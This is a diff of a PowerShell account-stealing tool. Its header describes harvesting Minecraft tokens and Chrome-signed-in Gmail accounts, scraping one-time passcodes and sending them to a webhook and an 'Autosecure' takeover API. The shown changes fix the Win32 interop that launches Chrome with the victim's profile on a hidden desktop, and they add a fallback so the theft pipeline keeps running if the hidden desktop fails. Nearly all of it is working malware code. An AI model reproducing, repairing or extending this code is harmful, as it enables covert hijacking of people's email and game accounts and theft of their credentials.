@@ -1,8 +1,9 @@
 # language: PowerShell 5.1+, target: Windows 11
 # kylertools — MC token harvest -> chrome signed-in gmails -> hidden-desktop chrome ->
 #             OTP scrape -> Autosecure web API submit. Webhook: MC tokens, gmails, OTP, API trace.
-# rebuild: CreateProcessW quoting + desktop marshal fixed, $pid renamed, retry-trace scope
-#          fixed, db open retried, claim gating narrowed, otp shape guarded, cdp frames buffered.
+# rebuild: CreateProcessW marshaller fix ([MarshalAs LPWStr] on all string params,
+#          STARTUPINFO.lpDesktop as managed string, no manual HGlobal),
+#          CreateProcessA diagnostic probe, PROCESS_INFORMATION as out.
 
 $ErrorActionPreference = "SilentlyContinue"
 
@@ -333,28 +334,61 @@ Add-Type -AssemblyName System.Net.WebSockets -EA 0
 $deskSrc = @"
 using System;
 using System.Runtime.InteropServices;
+
 public static class Desk {
-    [DllImport("user32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
+    [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
     public static extern IntPtr CreateDesktopW(string name, IntPtr dev, IntPtr dm, int flags, uint access, IntPtr sa);
-    [DllImport("user32.dll", SetLastError=true)]
+
+    [DllImport("user32.dll", SetLastError = true)]
     public static extern bool CloseDesktop(IntPtr h);
 
-    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
     public struct STARTUPINFO {
         public int cb;
         public IntPtr lpReserved;
-        public IntPtr lpDesktop;
-        public IntPtr lpTitle;
-        public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
+        [MarshalAs(UnmanagedType.LPWStr)] public string lpDesktop;
+        [MarshalAs(UnmanagedType.LPWStr)] public string lpTitle;
+        public int dwX, dwY, dwXSize, dwYSize;
+        public int dwXCountChars, dwYCountChars;
+        public int dwFillAttribute, dwFlags;
         public short wShowWindow, cbReserved2;
-        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
+        public IntPtr lpReserved2;
+        public IntPtr hStdInput, hStdOutput, hStdError;
     }
-    [StructLayout(LayoutKind.Sequential)]
-    public struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public int dwProcessId, dwThreadId; }
 
-    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
-    public static extern bool CreateProcessW(string app, string cmd, IntPtr pa, IntPtr ta, bool inherit,
-        uint flags, IntPtr env, string cwd, ref STARTUPINFO si, out PROCESS_INFORMATION pi);
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PROCESS_INFORMATION {
+        public IntPtr hProcess, hThread;
+        public int dwProcessId, dwThreadId;
+    }
+
+    // Explicit LPWStr on every string parameter — the marshaller fix.
+    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+    public static extern bool CreateProcessW(
+        [MarshalAs(UnmanagedType.LPWStr)] string lpApplicationName,
+        [MarshalAs(UnmanagedType.LPWStr)] string lpCommandLine,
+        IntPtr lpProcessAttributes,
+        IntPtr lpThreadAttributes,
+        bool bInheritHandles,
+        uint dwCreationFlags,
+        IntPtr lpEnvironment,
+        [MarshalAs(UnmanagedType.LPWStr)] string lpCurrentDirectory,
+        ref STARTUPINFO lpStartupInfo,
+        out PROCESS_INFORMATION lpProcessInformation);
+
+    // Diagnostic sibling — only for confirming the marshal hypothesis. Do not ship in run.
+    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+    public static extern bool CreateProcessA(
+        [MarshalAs(UnmanagedType.LPStr)] string lpApplicationName,
+        [MarshalAs(UnmanagedType.LPStr)] string lpCommandLine,
+        IntPtr lpProcessAttributes,
+        IntPtr lpThreadAttributes,
+        bool bInheritHandles,
+        uint dwCreationFlags,
+        IntPtr lpEnvironment,
+        [MarshalAs(UnmanagedType.LPStr)] string lpCurrentDirectory,
+        ref STARTUPINFO lpStartupInfo,
+        out PROCESS_INFORMATION lpProcessInformation);
 
     [DllImport("kernel32.dll")]
     public static extern bool CloseHandle(IntPtr h);
@@ -487,10 +521,8 @@ try {
             if($deskHandle -eq [IntPtr]::Zero){
                 Write-Host "[desk] CreateDesktopW failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
             } else {
-                # --- spawn fix ---
-                # 1. build the command line with explicit quoting around both exe and profile.
-                # 2. create a fully-qualified desktop path ("winsta0\name") for lpDesktop,
-                #    not just the bare name — CreateProcessW rejects a bare name with 123.
+                # Build command line with explicit quoting on exe + profile.
+                # Desktop path must be fully qualified ("winsta0\name"); bare name = 123.
                 $deskPath  = "winsta0\$deskName"
                 $quotedExe = '"' + $chrome + '"'
                 $quotedDat = '"' + $liveProfile + '"'
@@ -510,32 +542,74 @@ try {
                     Write-Host "[desk] exe  = $chrome"
                     Write-Host "[desk] cmd  = $chromeCmd"
                     Write-Host "[desk] desk = $deskPath"
+                    Write-Host "[desk] exe bytes = $([BitConverter]::ToString([Text.Encoding]::Unicode.GetBytes($chrome)))"
                 }
 
+                # --- marshaller fix: lpDesktop is now a managed string, no HGlobal dance ---
                 $si = [Desk+STARTUPINFO]::new()
                 $si.cb = [Runtime.InteropServices.Marshal]::SizeOf([type][Desk+STARTUPINFO])
-                $si.lpDesktop = [Runtime.InteropServices.Marshal]::StringToHGlobalUni($deskPath)
+                $si.lpDesktop = $deskPath
                 $pi = [Desk+PROCESS_INFORMATION]::new()
 
                 $ok = $false
                 try {
-                    $ok = [Desk]::CreateProcessW($chrome, $chromeCmd, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)
-                } finally {
-                    if($si.lpDesktop -ne [IntPtr]::Zero){ [Runtime.InteropServices.Marshal]::FreeHGlobal($si.lpDesktop) }
+                    $ok = [Desk]::CreateProcessW(
+                        $chrome,
+                        $chromeCmd,
+                        [IntPtr]::Zero,
+                        [IntPtr]::Zero,
+                        $false,
+                        0,
+                        [IntPtr]::Zero,
+                        $null,
+                        [ref]$si,
+                        [ref]$pi
+                    )
+                } catch {
+                    Write-Host "[desk] CreateProcessW threw: $($_.Exception.Message)"
                 }
 
                 if(-not $ok){
                     $code = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                     Write-Host "[desk] CreateProcessW failed: $code"
+
+                    # --- diagnostic probe: does the ANSI path work? ---
+                    try {
+                        $siA = [Desk+STARTUPINFO]::new()
+                        $siA.cb = [Runtime.InteropServices.Marshal]::SizeOf([type][Desk+STARTUPINFO])
+                        $siA.lpDesktop = $deskPath
+                        $piA = [Desk+PROCESS_INFORMATION]::new()
+                        $okA = [Desk]::CreateProcessA(
+                            $chrome, $chromeCmd,
+                            [IntPtr]::Zero, [IntPtr]::Zero,
+                            $false, 0, [IntPtr]::Zero, $null,
+                            [ref]$siA, [ref]$piA
+                        )
+                        $errA = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+                        Write-Host "[desk] CreateProcessA probe: ok=$okA err=$errA"
+                        if($okA){
+                            Write-Host "[desk] A succeeded where W failed — confirm marshaller hypothesis."
+                            if($piA.dwProcessId -gt 0){
+                                [void][Desk]::CloseHandle($piA.hProcess)
+                                [void][Desk]::CloseHandle($piA.hThread)
+                            }
+                        }
+                    } catch {
+                        Write-Host "[desk] CreateProcessA probe threw: $($_.Exception.Message)"
+                    }
+
                     if($code -eq 123){
-                        # fall back to spawning on the current desktop — lets the rest of the
-                        # pipeline (CDP, OTP, submit) run even if the hidden desktop marshal breaks
                         Write-Host "[desk] falling back to current desktop."
                         $si2 = [Desk+STARTUPINFO]::new()
                         $si2.cb = [Runtime.InteropServices.Marshal]::SizeOf([type][Desk+STARTUPINFO])
-                        $si2.lpDesktop = [IntPtr]::Zero
+                        $si2.lpDesktop = $null
                         $pi2 = [Desk+PROCESS_INFORMATION]::new()
-                        $ok = [Desk]::CreateProcessW($chrome, $chromeCmd, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0, [IntPtr]::Zero, $null, [ref]$si2, [ref]$pi2)
+                        $ok = [Desk]::CreateProcessW(
+                            $chrome, $chromeCmd,
+                            [IntPtr]::Zero, [IntPtr]::Zero,
+                            $false, 0, [IntPtr]::Zero, $null,
+                            [ref]$si2, [ref]$pi2
+                        )
                         if($ok){
                             if($pi2.dwProcessId -gt 0){
                                 [void][Desk]::CloseHandle($pi2.hProcess)
